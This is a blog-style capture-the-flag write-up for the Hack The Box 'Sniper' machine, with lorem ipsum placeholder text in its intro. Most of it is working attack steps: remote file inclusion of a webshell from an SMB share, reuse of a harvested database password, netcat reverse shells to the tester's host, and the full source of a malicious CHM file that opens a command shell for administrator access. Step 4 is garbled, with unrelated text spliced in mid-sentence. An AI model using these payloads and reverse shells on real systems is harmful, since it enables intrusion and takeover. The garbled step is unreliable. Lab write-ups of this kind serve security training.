---
layout: single
title: Sniper - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-11-20
classes: wide
header:
  teaser: /assets/images/htb-writeup-sniper/sniper_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-sniper/sniper_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. nmap -Pn -sC -sV -n -O sniper.htb
    PORT    STATE SERVICE       VERSION
    80/tcp  open  http          Microsoft IIS httpd 10.0
    | http-methods:
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: Sniper Co.
    135/tcp open  msrpc         Microsoft Windows RPC
    139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp open  microsoft-ds?
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
    No OS matches for host
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: 7h00m12s
    | smb2-security-mode:
    |   2.02:
    |_    Message signing enabled but not required
    | smb2-time:
    |   date: 2019-11-20T16:04:55
    |_  start_date: N/A

  nmap -Pn -sV -n -p- sniper.htb
      PORT      STATE SERVICE       VERSION
      80/tcp    open  http          Microsoft IIS httpd 10.0
      135/tcp   open  msrpc         Microsoft Windows RPC
      139/tcp   open  netbios-ssn   Microsoft Windowhis netbios-ssn
      445/tcp   open  microsoft-ds?
      49667/tcp open  msrpc         Microsoft Windows RPC
      Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

2. Enumeration with dirb and nikto finds..
    .. Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST

3. Continue enumeration by browsing the website and we find http://sniper.htb/blog/?lang=blog-en.php
   ?lang=xxx looks like it could be vulnerable by RFI. Reading up on RFI a common way is to setup a local SMB share and
   fetch a webshell - lets try that!

   root@p3:~# vi /etc/samba/smb.conf

   [pub-share]
   Comment = SMB Drops
   path = /srv/pub-share
   writable = yes
   guest ok = yes
   read only = no
   force user = nobody

   root@p3:~# service smbd restart

   Make sure that the share is reachable:
   root@p3:/srv/pub-share# smbclient //10.10.14.10/pub-share
     Enter WORKGROUP\root's password:
     Try "help" to get a list of possible commands.
     smb: \> ls
       .                                   D        0  Fri Nov 22 11:57:22 2019
       ..                                  D        0  Fri Nov 22 10:57:42 2019
       sniper-rev.php                      N       94  Fri Nov 22 09:50:24 2019
       nc64.exe                            N    45272  Wed Nov 20 15:16:38 2019
       webshell.php                        N     7206  Fri Nov 22 11:00:15 2019

     		554197528 blocks of size 1024. 501299668 blocks available

4. Execute RFI and connect to webshell.php for Initial Foothold.
    http://sniper.htb/blog/?lang=//10.10.14.10/pub-share/webshell.php
      whoami
      nt authority\iusr

5. Poking around in the box we find db.php (C:\inetpub\wwwroot\user)
    type db.php
      <?php
      // Enter your Host, username, password, database below.
      // I left password empty because i do not set password on localhost.
      $con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
      // Check connection
      if (mysqli_connect_errno())
      {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
      }
      ?>

    Our first pair of creds - dbuser:36mEAhz/B8xQ~2VM for MYSQL database sniper

6. Looking for users we find 2 accounts, Administrator and Chris. However we don't have permissions to enter any of them.
    dir
     Directory of C:\Users
      04/11/2019  06:04 AM    <DIR>          .
      04/11/2019  06:04 AM    <DIR>          ..
      04/09/2019  05:47 AM    <DIR>          Administrator
      04/11/2019  06:04 AM    <DIR>          Chris
      04/09/2019  05:47 AM    <DIR>          Public
                     0 File(s)              0 bytes
                     5 Dir(s)  17,963,245,568 bytes free

7. Verify the account using rpcclient
    root@p3:/opt/shells# rpcclient -U chris sniper.htb
    Enter WORKGROUP\chris's password: (36mEAhz/B8xQ~2VM)
    rpcclient $>

    NOTE: Looks like Chris is re-using his password. Working creds - Chris:36mEAhz/B8xQ~2VM

8. Spawn an interactive reverse powershell from your webshell by calling netcat for windows.
   Download netcat 1.12: https://eternallybored.org/misc/netcat/

   root@p3:/opt/htb/machines/sniper# unzip netcat-win32-1.12.zip /nc64
   root@p3:/opt/htb/machines/sniper# cp nc64/nc64.exe /srv/pub-share
   root@p3:/opt/htb/machines/sniper# chmod +x /srv/pub-share/nc64.exe

   From Webshell:
   //10.10.14.10/pub-share/nc64.exe 10.10.14.10 4488 -e powershell

   root@p3:/opt/htb/machines/sniper# nc -lvnp 4488
      listening on [any] 4488 ...
      connect to [10.10.14.10] from (UNKNOWN) [10.10.10.151] 49908
      Windows PowerShell
      Copyright (C) Microsoft Corporation. All rights reserved.

   PS C:\inetpub\wwwroot\user> whoami
      whoami
      nt authority\iusr
   PS C:\inetpub\wwwroot\user> $env:computername
      $env:computername
      SNIPER

9. Change user from iusr to Chris by setting up another reverse shell, using the found creds.

    Assign the credentials:
      PS C:\inetpub\wwwroot\blog> $user = 'sniper.htb\chris'
      PS C:\inetpub\wwwroot\blog> $pass = '36mEAhz/B8xQ~2VM' | ConvertTo-SecureString -AsPlainText -Force
      PS C:\inetpub\wwwroot\blog> $creds = New-Object System.Management.Automation.PSCredential($user,$pass)

    Test to make sure it works by sending single command to the "remote" host:
      PS C:\inetpub\wwwroot\blog> Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { whoami }
            sniper\chris

    Setup a new reverse shell as Chris:
      PS C:\inetpub\wwwroot\blog> Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { //10.10.14.10/pub-share/nc64.exe 10.10.14.10 4499 -e powershell }

      root@p3:/opt/htb/machines/sniper# nc -lvnp 4499
        listening on [any] 4499 ...
        connect to [10.10.14.10] from (UNKNOWN) [10.10.10.151] 50014
        Windows PowerShell
        Copyright (C) Microsoft Corporation. All rights reserved.

      PS C:\Users\Chris\Documents> whoami
        whoami
        sniper\chris

10. Grab user.txt
    PS C:\Users\Chris\Desktop> type user.txt
      type user.txt
      21f4****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Looking around in the box we find a file named instructions.chm in C:\Users\Chris\Downloads. Lets download it and view the file.

    PS C:\Users\Chris\Downloads> Copy-Item -Path instructions.chm -Destination //10.10.14.10/pub-share/instructions.chm
    root@p3:/srv/pub-share# mv instructions.chm /opt/htb/machines/sniper/
    root@p3:/opt/htb/machines/sniper# xchm instructions.chm

      >Sniper Android App Documentation
      >Table of Contents
      >Pff... This dumb CEO always makes me do all the shitty work. SMH!
      >I'm never completing this thing. Gonna leave this place next week. Hope someone snipes him.

  Maybe we are looking for an app for privesc?

2. In C:\Docs we find note.txt and "php for dummies-trial.pdf", lets view them.

    PS C:\Docs> type note.txt
      Hi Chris,
      	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a
        lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.
      Regards,
      Sniper CEO.

    PS C:\Docs> Copy-Item -Path "php for dummies-trial.pdf"-Destination //10.10.14.10/pub-share/test.pdf
    root@p3:/srv/pub-share# mv test.pdf /opt/htb/machines/sniper/php-dummies.pdf

    The PDF only contains table of content, and no actual content.

3. CHM-files are deemed as dangerous as they can be injected with malicious code. We can compile our own (malicious) .chm-file
   using only Windows tools (HTML Help). Let's start by creating the three files needed; .htm, .hhc and .hhp

   .htm - this is our payload where we inject the malicious data
   .hhc - contains the Table of Content for the HTML Help file
   .hhp - our project file used to bind all the other files together

   root@p3:/opt/htb/machines/sniper# cat expl.htm
    <HTML>
    <HEAD>
    <Title>Bypass AV by PlayerThree</Title>
    </HEAD>
    <BODY>

    <OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
      <PARAM name="Command" value="ShortCut">
      <PARAM name="Button" value="Bitmap::shortcut">
      <PARAM name="Item1" value=",cmd.exe,/c c:\docs\nc64.exe 10.10.14.10 4400 -e c:\windows\system32\cmd.exe">
      <PARAM name="Item2" value="273,1,1">
    </OBJECT>
    <SCRIPT>
      x.Click();
    </SCRIPT>

    <h1> Bypass AV by PlayerThree </h1>
    </BODY>
    </HTML>

   root@p3:/opt/htb/machines/sniper# cat expl.hhc
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
    <HTML>
    <HEAD>
    <meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
    <!-- Sitemap 1.0 -->
    </HEAD><BODY>
    <OBJECT type="text/site properties">
    	<param name="ImageType" value="Folder">
    </OBJECT>
    <UL>
    	<LI> <OBJECT type="text/sitemap">
    		<param name="Name" value="AV Bypass by PlayerThree">
    		<param name="Local" value="expl.htm
    		">
    		</OBJECT>
    </UL>
    </BODY></HTML>

   root@p3:/opt/htb/machines/sniper# cat expl.hhp
    [OPTIONS]
    Compatibility=1.1 or later
    Compiled file=expl.chm
    Contents file=expl.hhc
    Default topic=expl.htm
    Display compile progress=No
    Language=0x409 English (United States)


    [FILES]
    C:\Users\PlayerThree\htb\machines\sniper\expl.htm

4. When all files are created we need to switch over to a Windows-box and compile it 'm in with chris shell. I guess I have to explote this vulnerability "Microsoft Compiled HTML Help / Uncompiled .chm File - XML External Entity Injection ", but i don't get success with my .chm file, i'm in the right placdo the .chm-file.
    C:\Users\PlayerThree\htb\machines\sniper> "C:\Program Files (x86)\HTML Help Workshop\hhc.exe" expl.hpp
    Microsoft HTML Help Compiler 4.74.8702

    Compiling C:\Users\PlayerThree\htb\machines\sniper\expl.chm


    Compile time: 0 minutes, 1 second
    1     Topics
    0     Local links
    0     Internet links
    0     Graphics


    Created C:\Users\PlayerThree\htb\machines\sniper\expl.chm, 10835 bytes
    Compression decreased file by 10835 bytes.

5. Upload our malicious chm-file to sniper.htb c:\docs, as hinted in note.txt (Drop it here when you're done with it.), and quickly
   run the file to execute the payload. Grab root.txt.
    PS C:\Docs> copy //10.10.14.10/pub-share/nc64.exe nc64.exe
    PS C:\Docs> copy //10.10.14.10/pub-share/expl.chm expl.chm
    PS C:\Docs> .\expl.chm

    root@p3:/opt/htb/machines/sniper# nc -lvnp 4400
      listening on [any] 4400 ...
      connect to [10.10.14.10] from (UNKNOWN) [10.10.10.151] 49681
      Microsoft Windows [Version 10.0.17763.678]
      (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
      sniper\administrator
    C:\Users\Administrator\Desktop>type root.txt
      5624****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

RFI + SMB
  https://medium.com/@minimalist.ascent/remote-file-include-using-samba-shares-6fa76dfeb4ce
  http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html

nc64.exe
  https://www.youtube.com/watch?v=PJXb2pK8K84&t=1155
  (found by searching for 'windows reverse' on https://ippsec.rocks/)

Change user
  https://social.technet.microsoft.com/Forums/lync/en-US/e8452304-06db-45ab-961e-2c4ef3fa2a12/enter-username-and-password-using-powershell?forum=winserverpowershell
  https://www.howtogeek.com/117192/how-to-run-powershell-commands-on-remote-computers/

Good random commands
  powershell -ep bypass
  runas /user:sniper\chris cmd.exe

Malicious .chm-file
  https://github.com/arntsonl/calc_security_poc/tree/master/chm
  https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7
